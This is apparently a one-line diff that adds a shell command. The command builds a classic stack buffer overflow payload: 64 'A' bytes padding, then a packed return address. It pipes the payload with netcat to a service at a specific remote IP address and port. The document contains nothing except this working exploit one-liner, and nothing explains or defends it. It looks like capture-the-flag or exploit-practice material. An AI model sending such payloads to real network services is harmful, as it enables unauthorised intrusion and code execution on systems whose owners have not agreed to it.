@@ -1,0 +1,1 @@
+python -c "print 'A'*64 + __import__('struct').pack('<I', 0x08048aec)" | nc 128.238.66.240 65535
